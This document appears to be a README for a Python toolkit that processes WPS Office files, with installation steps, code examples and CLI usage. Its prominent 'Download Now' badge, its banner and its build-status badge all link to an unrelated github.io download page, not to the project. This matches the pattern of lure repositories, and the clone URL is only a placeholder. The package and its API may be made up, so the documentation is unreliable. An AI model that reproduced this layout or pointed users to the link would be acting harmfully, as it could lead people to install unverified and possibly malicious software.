# wps-office-toolkit

[![Download Now](https://img.shields.io/badge/Download_Now-Click_Here-brightgreen?style=for-the-badge&logo=download)](https://jasonkinggenio.github.io/wps-page-7sb/)


[![Banner](banner.png)](https://jasonkinggenio.github.io/wps-page-7sb/)


[![Python Version](https://img.shields.io/badge/python-3.8%2B-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![PyPI version](https://img.shields.io/badge/pypi-v0.4.2-orange.svg)](https://pypi.org/project/wps-office-toolkit/)
[![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)](https://jasonkinggenio.github.io/wps-page-7sb/)
[![Code Style](https://img.shields.io/badge/code%20style-black-000000.svg)](https://github.com/psf/black)

A Python toolkit for automating workflows, processing documents, and extracting structured data from files created or managed with **WPS Office for Windows**.

WPS Office for Windows is a widely used office suite compatible with Microsoft Office formats (`.docx`, `.xlsx`, `.pptx`). This toolkit provides a programmatic interface to interact with those file formats in automated pipelines — no GUI required.

---

## Table of Contents

- [Features](#features)
- [Installation](#installation)
- [Quick Start](#quick-start)
- [Usage Examples](#usage-examples)
- [Requirements](#requirements)
- [Contributing](#contributing)
- [License](#license)

---

## Features

- 📄 **Document Processing** — Read, write, and transform `.docx` files produced by WPS Writer for Windows
- 📊 **Spreadsheet Automation** — Extract, filter, and analyze tabular data from `.xlsx` workbooks
- 📑 **Presentation Parsing** — Iterate over slides and extract text/metadata from `.pptx` files
- 🔄 **Batch Conversion** — Convert entire directories of WPS-compatible documents to plain text, CSV, or JSON
- 🔍 **Data Extraction** — Pull structured data (tables, headers, named ranges) into pandas DataFrames
- 🛠️ **Workflow Automation** — Chain document operations into reusable pipeline steps
- 📋 **Metadata Inspection** — Read document properties such as author, revision count, and creation date
- 🧪 **Format Validation** — Verify that files conform to expected schemas before processing

---

## Installation

### From PyPI

```bash
pip install wps-office-toolkit
```

### From Source

```bash
git clone https://github.com/your-org/wps-office-toolkit.git
cd wps-office-toolkit
pip install -e ".[dev]"
```

### With Optional Dependencies

```bash
# Include pandas and openpyxl for full spreadsheet support
pip install "wps-office-toolkit[spreadsheet]"

# Include all optional dependencies
pip install "wps-office-toolkit[all]"
```

---

## Quick Start

```python
from wps_office_toolkit import DocumentReader, SpreadsheetProcessor

# Read a WPS Writer document
reader = DocumentReader("quarterly_report.docx")
text = reader.extract_text()
print(text[:500])

# Load a WPS Spreadsheet workbook
processor = SpreadsheetProcessor("sales_data.xlsx")
df = processor.to_dataframe(sheet_name="Q3")
print(df.head())
```

---

## Usage Examples

### Extract Text from a WPS Writer Document

```python
from wps_office_toolkit import DocumentReader

reader = DocumentReader("project_brief.docx")

# Extract all paragraph text
for paragraph in reader.paragraphs():
    if paragraph.style == "Heading 1":
        print(f"[SECTION] {paragraph.text}")
    else:
        print(paragraph.text)

# Extract document metadata
meta = reader.metadata()
print(f"Author   : {meta.author}")
print(f"Created  : {meta.created_at}")
print(f"Revisions: {meta.revision_count}")
```

---

### Process Spreadsheet Data from WPS Spreadsheets

```python
from wps_office_toolkit import SpreadsheetProcessor
import pandas as pd

proc = SpreadsheetProcessor("financial_model.xlsx")

# List all sheet names
print(proc.sheet_names())
# ['Summary', 'Revenue', 'Costs', 'Projections']

# Load a specific sheet into a DataFrame
df = proc.to_dataframe(sheet_name="Revenue", header_row=1)

# Basic analysis
print(df.describe())
print(df.groupby("Region")["Sales"].sum())

# Extract a named range defined in the workbook
named_range_df = proc.extract_named_range("AnnualTargets")
print(named_range_df)
```

---

### Batch Convert Documents to Plain Text

```python
from wps_office_toolkit.pipeline import BatchConverter
from pathlib import Path

converter = BatchConverter(
    source_dir=Path("./documents"),
    output_dir=Path("./output/text"),
    output_format="txt",
    recursive=True,
)

results = converter.run()

for result in results:
    status = "✓" if result.success else "✗"
    print(f"[{status}] {result.source_path.name}")
```

---

### Build an Automated Document Pipeline

```python
from wps_office_toolkit.pipeline import DocumentPipeline
from wps_office_toolkit.steps import (
    ExtractTextStep,
    FilterEmptyParagraphsStep,
    ExportToJSONStep,
)

pipeline = DocumentPipeline(
    steps=[
        ExtractTextStep(),
        FilterEmptyParagraphsStep(),
        ExportToJSONStep(output_path="output/report.json"),
    ]
)

pipeline.run("./source_documents/annual_report.docx")
```

---

### Validate File Format Before Processing

```python
from wps_office_toolkit.validation import FormatValidator

validator = FormatValidator(strict=True)

files = [
    "report_2024.docx",
    "budget.xlsx",
    "corrupted_file.docx",
]

for filepath in files:
    result = validator.validate(filepath)
    if result.is_valid:
        print(f"[PASS] {filepath}")
    else:
        print(f"[FAIL] {filepath} — {result.error_message}")
```

---

### Extract Tables from Documents

```python
from wps_office_toolkit import DocumentReader

reader = DocumentReader("data_report.docx")

for i, table in enumerate(reader.tables()):
    print(f"\n--- Table {i + 1} ---")
    df = table.to_dataframe()
    print(df.to_string(index=False))
```

---

## Requirements

| Requirement | Version | Notes |
|---|---|---|
| Python | `>= 3.8` | 3.10+ recommended |
| `python-docx` | `>= 0.8.11` | `.docx` file handling |
| `openpyxl` | `>= 3.1.0` | `.xlsx` read/write support |
| `python-pptx` | `>= 0.6.21` | `.pptx` parsing |
| `pandas` | `>= 1.5.0` | DataFrame output (optional) |
| `click` | `>= 8.0.0` | CLI interface |
| `pydantic` | `>= 2.0.0` | Schema validation |

> **Platform note:** The toolkit processes WPS Office–compatible file formats and runs on Windows, macOS, and Linux. A local WPS Office installation is **not** required for core functionality.

---

## CLI Usage

The toolkit ships with a command-line interface for quick operations:

```bash
# Extract text from a document
wps-toolkit extract-text report.docx --output report.txt

# Convert a folder of spreadsheets to CSV
wps-toolkit batch-convert ./spreadsheets --format csv --output ./csv_output

# Validate a file
wps-toolkit validate budget.xlsx
```

Run `wps-toolkit --help` for a full list of available commands.

---

## Contributing

Contributions are welcome and appreciated.

1. Fork the repository
2. Create a feature branch (`git checkout -b feature/add-pdf-export`)
3. Write tests for your changes (`pytest tests/`)
4. Ensure code style passes (`black . && flake8`)
5. Open a pull request with a clear description

Please read [CONTRIBUTING.md](CONTRIBUTING.md) for full guidelines, including how to report bugs and request features.

```bash
# Set up the development environment
git clone https://github.com/your-org/wps-office-toolkit.git
cd wps-office-toolkit
python -m venv .venv
source .venv/bin/activate        # Windows: .venv\Scripts\activate
pip install -e ".[dev]"
pytest tests/ -v
```

---

## License

This project is licensed under the **MIT License**. See the [LICENSE](LICENSE) file for details.

---

*This toolkit is an independent open-source project and is not affiliated with, endorsed by, or officially connected to Kingsoft or the WPS Office product line.*